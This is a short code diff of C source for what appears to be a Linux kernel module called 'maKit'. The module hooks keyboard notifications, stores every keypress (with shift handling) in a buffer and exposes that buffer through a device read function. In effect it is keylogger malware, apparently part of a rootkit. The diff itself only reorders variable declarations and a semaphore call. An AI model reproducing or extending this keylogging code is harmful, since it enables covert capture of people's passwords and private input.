@@ -88,10 +88,10 @@ int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
         	}
 		//Store keys to buffer
         	if(param->down){
-            		down(&s);
 			int i;
-			i = 0;
 			char c;
+			i = 0;
+			down(&s);
 			if(shiftPressed){
 				while(i < strlen(keysShift[param->value])){
 					c = keysShift[param->value][i];
@@ -128,8 +128,10 @@ int open_dev(struct inode *inode, struct file *filp){
 ssize_t read_dev(struct file *filp, char __user *buf, size_t count, 
 						loff_t *posPtr){
 	//printk(KERN_ALERT "maKit: read_dev executed!\n");
-	int key = 0;
-	char* buffer = keyBuffer;
+	int key;
+	char* buffer;
+	key = 0;
+	buffer = keyBuffer;
 	while(*buffer != '\0'){
 		key++;
 		buffer++;
